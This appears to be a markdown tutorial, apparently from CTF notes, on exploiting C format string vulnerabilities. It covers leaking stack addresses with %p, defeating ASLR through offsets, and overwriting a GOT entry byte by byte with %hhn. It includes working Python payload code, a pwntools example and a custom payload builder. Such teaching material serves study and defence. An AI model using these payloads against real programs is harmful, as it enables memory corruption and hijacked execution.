# Format Strings

It is the responsibility of the caller to push the relevant arguments for the format function to the stack. This means if the arguments are not supplied the format function goes looking for its `vargs...` on the stack. This creates a format string vulnerability where we can supply as many format specifier flags as the buffer allows.


## Layout of Format Specifier Flags

`%<flags><width><precision><modifier><type>`

### `Types`

+ `%s` 
    + print as string
+ `%x`
    + print as hex
+ `%p`
    + print as pointer
+ `%c`
    + print as char
+ `%d`
    + print as (signed) int
+ `%u`
    + print as (unsigned) int
+ `%n`  --> **Exceptionally Useful**
    + write the number of printed bytes

### `Modifiers`

* `%d`
    + print as (signed) int  
* `%hd`
    + print as half (signed) int  
* `%hhd`
    + print as half half (signed) int  
* `%n`
    + write as int
* `%hn`
    + write as half int
* `%hhn`
    + write as half half int

### `Precision`

+ `printf("%.3s", "abcdef");`
    + `>> "abc"`
+ Strips the supplied argument to some positional

### `Width`

+ `%<x>d`
    + Print `x` whitespace bytes then the `d` argument
+ Traditionally used to pad output with whitespace
    
    ```c
    printf("%5d", 10);

    >>    10
    ```
+ We repurposed it to save space in our payload in the face of a smaller buffer

### `Flags`


* `-`
    + Left-align the output
* `+`
    + Prepends a plus for positive signed-numeric types
* `\`
    + Prepends a space for positive signed-numeric types
* `0`
    + Prepends zeros
* `'`
    + Show thousandths separators
* `#`
    + misc


## Dumping The Stack

+ In some cases we may desire only to leak addresses off the stack, or comb 
+ For example in a fully remote exploit where we want a secret from memory and do not have the binary locally
+ In these cases we are not interested in writing memory 
+ The approach for dumping the stack is fairly simple normally we want to fill the buffer with as many `%{index}$p` format specifiers as it will allow and then put this in a loop which increases all of the indexes sequentially
+ The following is a crude python implementation

```python
def dump_stack():
    # <get banners ect>
    for base_index in range(0, STACK_BOUNDARY):
        process.sendline(f'%{base_index}$p %{base_index + 1}$p %{base_index + 2}$p %{base_index + 3}$p')
        process.recvutil('<some-pattern>') 
```

## Leaking Addresses

+ The strength of a single leaked address in the stack, GOT or library regions cannot be underrated and forms the basis of the easiest [memory protection circumvention]() strategies
+ In many cases with an address discoverable at runtime the offsets to many useful memory segments can be calculated allowing an attacker near arbitrary control of the binary

### Example

+ Consider a simple binary with PIE and ASLR enabled 
+ There is a small buffer, just large enough for a simple `/bin/sh` shellcode, that we control input data to
+ There is also a vulnerable `printf` function which reads from a buffer which allows for a single format specifier to be supplied
+ Initially we have no way of determining where our buffer is, other than guessing, and the buffer is far too small to supplement with a nop sled
+ However by supplying a single `%p` to the vulnerable `printf` buffer we can leak an address off the stack
+ Now with simple reversing/debugging we can take the address leaked from `printf` and subtract / add the address of the other controlled buffer to work out how far apart they are
    + For example imagine `%p` returns the address `0x080488a1` and our buffer for this particular execution is @ `0x080486b4` (determined with debugger) 
    + We can then calculate the offset `0x080488a1 - 0x080486b4 = 493` to our buffer which will remain the same between executions
    + Hence we can overflow the return pointer with `<%p-leaked-addr> - 493` to jump to our shellcode, if we have a BOF of course 

## Writing Values

+ Enter the `%n` family of format specifiers 
+ These specifiers are what really give format string vulnerabilities their name because they have the power to write bytes

### `%n` Usage and Pitfalls

+ The following exploit snippet demonstrates the use of `%n` to write some specific data  to an address `target_addr + b"%4$1162691917x" + b"%4$n"` 
+ The issue here however is that we attempt to write `1162691917` bytes (ASCII for 'MEME'), thats a lot of bytes especially over your dial up ADSL connection
+ In fact this exact payload crashed my laptop

### `%hhn` and `%hn`

+ A common strategy instead of writing a bazillion bytes at once we can write two bytes at a time, with `%hn` or even one byte at a time with `%hhn` 
+ This results in a smaller payload size, an easier to implement exploit, and more reliable exploit overall 
+ In many cases it may be easier to simply write one byte at a time, the following explains how to implement this

#### Example

+ Suppose we want to overwrite the GOT entry for `printf` @ `0x8049843` with the address of a win function @ `0x08048536`
+ We can can do so one byte at a time with `hhn` in the following fashion

```python
    payload = b""
    payload += p32(got_printf)          # <- Lowest byte
    payload += p32(got_printf + 1)      # <- 2rd lowest byte
    payload += p32(got_printf + 2)      # <- 3rd lowest byte
    payload += p32(got_printf + 3)      # <- 4th lowest byte

    # --- We subtract 16 off 0x36 here
    # to account for the 16 bytes of 
    # addresses we have already written
    payload += b"%38c%3$hhn"            # @0x36 <- 54 - 16  = 38 (4 addrs @ 4 bytes each)
    
    # --- We proceed by simply 
    # subtracting the previous byte
    # from the current byte and 
    # writing that decimal value 
    payload += b"%79c%4$hhn"            # @0x85 <- 0x85 - 0x36

    # --- Where the value we wish 
    # to write is negative we
    # can overflow the value to
    # the desired one by adding
    # 0x100 padding to wrap around
    payload += b"%127c%5$hhn"           # @0x04 <- (0x04 - 0x85) + 0x100
    payload += b"%4c%6$hhn"             # @0x08 <- (0x08 - 0x04)
```
+ Note the changing byte reference alongside the format specifier 
+ In many cases your address in the buffer will be further away then the example demonstrates and thus the referenced bytes will need to be changed accordingly 

## Automated Format Sting Payloads

As will often be the case enabled memory protections will prevent the hardcoding of addresses in format string payloads meaning that they will need to be constructed dynamically using a leak and offset calculations. Furthermore the process of constructing format string payloads is repetitive and the code largely unchanging. 

Hence, [pwntools](../tooling#pwntools) implements a function to automatically construct format string payloads. An example usage is bellow.


```python
bytes_offset = 2

addr_val = 0x0809879d       # win function
target_addr = 0x0809183b    # printf plt

#                        start bytes
payload = fmtstr_payload(bytes_offset, {target_addr: addr_val}, numbwritten=1, write_size='byte')
```

**However**, this library function has a critical flaw. It often writes more bytes then are required to actually write the desired value to memory, this often leads to corruption of the stack. Hence it is often useful to have your own library function to construct format string payloads that writes the smallest possible number of bytes. Such a function may look like the following.


```python
""" Custom Builder for format string payloads """

# Wrapper constant
WRAP = 0x100
# Account for already written bytes
ADJUST = 16

'''
► <int> target                :: Address to write to
► <int, 16> goal              :: Value to write
► <int> start_byte            :: Index of lowest byte (buffer position)
'''

def build(target, goal, start_byte=1, max_write=4):
    # >->  Goal Construction  <-<
    bytes = [
        (goal & 0x000000FF), 
        (goal & 0x0000FF00) >> 0x8, 
        (goal & 0x00FF0000) >> 0x10, 
        (goal & 0xFF000000) >> 0x18
    ]

    # >->  Target Construction  <-<
    payload = b''.join([p32(target + offt) for offt in range(0, 4)])
    adjust = ADJUST

    for byte in range(0, max_write):
        current_byte = (bytes[byte] - adjust) if (bytes[byte] - adjust >= 0) else (bytes[byte] - adjust) + WRAP
        payload += f'%{current_byte}c%{start_byte + byte}$hhn'.encode()
        adjust = bytes[byte]

    return payload
```

